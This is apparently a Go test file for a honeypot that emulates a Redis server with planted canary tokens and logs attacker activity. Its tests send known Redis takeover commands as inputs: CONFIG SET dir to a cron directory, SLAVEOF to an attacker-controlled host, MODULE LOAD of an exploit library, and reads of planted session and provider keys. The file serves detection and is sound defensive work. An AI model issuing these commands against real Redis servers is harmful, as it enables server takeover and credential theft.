package demogpu

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"testing"
	"time"

	"agenttrap/internal/events"
)

func redisTestServer(t *testing.T) (string, *Server, *sink) {
	t.Helper()
	s, rec := newTestServer(t, Options{})
	if s.pack.Redis == nil {
		t.Fatal("built-in pack has no redis section")
	}
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)
	go func() { _ = s.ServeRedis(ctx, ln, RedisOptions{}) }()
	return ln.Addr().String(), s, rec
}

// redisClient is a tiny RESP client for the tests.
type redisClient struct {
	c  net.Conn
	br *bufio.Reader
}

func dialRedis(t *testing.T, addr string) *redisClient {
	t.Helper()
	c, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		t.Fatal(err)
	}
	_ = c.SetDeadline(time.Now().Add(5 * time.Second))
	t.Cleanup(func() { c.Close() })
	return &redisClient{c: c, br: bufio.NewReader(c)}
}

// cmd sends a command in RESP array form and returns the reply as a string:
// arrays are joined with "\n".
func (r *redisClient) cmd(t *testing.T, args ...string) string {
	t.Helper()
	var b strings.Builder
	fmt.Fprintf(&b, "*%d\r\n", len(args))
	for _, a := range args {
		fmt.Fprintf(&b, "$%d\r\n%s\r\n", len(a), a)
	}
	if _, err := io.WriteString(r.c, b.String()); err != nil {
		t.Fatal(err)
	}
	reply, err := readReply(r.br)
	if err != nil {
		t.Fatalf("%v (cmd %v)", err, args)
	}
	return reply
}

func readReply(br *bufio.Reader) (string, error) {
	typ, err := br.ReadByte()
	if err != nil {
		return "", err
	}
	line, err := br.ReadString('\n')
	if err != nil {
		return "", err
	}
	line = strings.TrimRight(line, "\r\n")
	switch typ {
	case '+', '-', ':':
		return line, nil
	case '_':
		return "", nil // RESP3 null
	case '$':
		n, _ := strconv.Atoi(line)
		if n < 0 {
			return "", nil
		}
		buf := make([]byte, n+2)
		if _, err := io.ReadFull(br, buf); err != nil {
			return "", err
		}
		return string(buf[:n]), nil
	case '*', '%':
		n, _ := strconv.Atoi(line)
		if typ == '%' {
			n *= 2
		}
		var parts []string
		for i := 0; i < n; i++ {
			p, err := readReply(br)
			if err != nil {
				return "", err
			}
			parts = append(parts, p)
		}
		return strings.Join(parts, "\n"), nil
	}
	return "", fmt.Errorf("unknown reply type %q", typ)
}

func TestRedisBasicsAndInfo(t *testing.T) {
	addr, s, rec := redisTestServer(t)
	c := dialRedis(t, addr)
	if got := c.cmd(t, "PING"); got != "PONG" {
		t.Fatalf("PING: %q", got)
	}
	if got := c.cmd(t, "INFO"); !strings.Contains(got, "redis_version:"+s.pack.Redis.Version) {
		t.Fatalf("INFO missing version: %q", firstLine(got))
	}
	if got := c.cmd(t, "CONFIG", "GET", "dir"); !strings.Contains(got, s.pack.Redis.Config["dir"]) {
		t.Fatalf("CONFIG GET dir: %q", got)
	}
	// KEYS lists the planted keys.
	if got := c.cmd(t, "KEYS", "*"); !strings.Contains(got, "demogpu:session:console:svc-ci") {
		t.Fatalf("KEYS: %q", got)
	}
	var connect bool
	for _, ev := range rec.evs {
		if ev.Kind == events.KindConnect && ev.Protocol == "redis" {
			connect = true
		}
	}
	if !connect {
		t.Fatal("connect not recorded")
	}
}

func TestRedisAuthRecorded(t *testing.T) {
	addr, _, rec := redisTestServer(t)
	c := dialRedis(t, addr)
	if got := c.cmd(t, "AUTH", "hunter2"); !strings.Contains(got, "no password is set") {
		t.Fatalf("AUTH: %q", got)
	}
	var hashed bool
	for _, ev := range rec.evs {
		if ev.CredentialSHA256 != "" {
			hashed = true
		}
	}
	if !hashed {
		t.Fatal("AUTH password not recorded as a credential")
	}
}

func TestRedisReadMintsCanary(t *testing.T) {
	addr, s, rec := redisTestServer(t)
	c := dialRedis(t, addr)
	val := c.cmd(t, "GET", "demogpu:session:console:svc-ci")
	if slot, id, ok := s.canaries.Identify(val); !ok || slot != "redis_session_token" || id == "" {
		t.Fatalf("GET did not mint a session token: %q (slot %q ok %v)", val, slot, ok)
	}
	if !hasEvent(rec.evs, events.KindCanaryExposed, "redis_session_token") {
		t.Fatal("exposure not recorded")
	}
	// The provider-key cache entry ties Redis into the vLLM chain.
	pk := c.cmd(t, "GET", "demogpu:cache:provider_key:vllm")
	if slot, _, ok := s.canaries.Identify(pk); !ok || slot != SlotVLLMKey {
		t.Fatalf("provider key cache read: %q slot %q", pk, slot)
	}
}

func TestRedisTakeoverMovesRecorded(t *testing.T) {
	addr, _, rec := redisTestServer(t)
	c := dialRedis(t, addr)
	// The classic CONFIG SET file-write technique: nothing changes, but the
	// parameter and value are recorded.
	if got := c.cmd(t, "CONFIG", "SET", "dir", "/var/spool/cron"); got != "OK" {
		t.Fatalf("CONFIG SET: %q", got)
	}
	if ev := lastOp(rec.evs, "redis_config_set"); ev.Detail["param"] != "dir" || ev.Detail["value"] != "/var/spool/cron" {
		t.Fatalf("config set not recorded: %+v", ev.Detail)
	}
	// Replication takeover: the master address is the attacker's own host.
	if got := c.cmd(t, "SLAVEOF", "203.0.113.9", "6379"); got != "OK" {
		t.Fatalf("SLAVEOF: %q", got)
	}
	if ev := lastOp(rec.evs, "redis_replicaof"); ev.Detail["master"] != "203.0.113.9:6379" {
		t.Fatalf("replicaof not recorded: %+v", ev.Detail)
	}
	// Module load for RCE: refused, but recorded.
	if got := c.cmd(t, "MODULE", "LOAD", "/tmp/exp.so"); !strings.Contains(got, "Error loading") {
		t.Fatalf("MODULE LOAD: %q", got)
	}
	if ev := lastOp(rec.evs, "redis_module"); ev.Detail["command"] != "MODULE" {
		t.Fatalf("module not recorded: %+v", ev.Detail)
	}
}
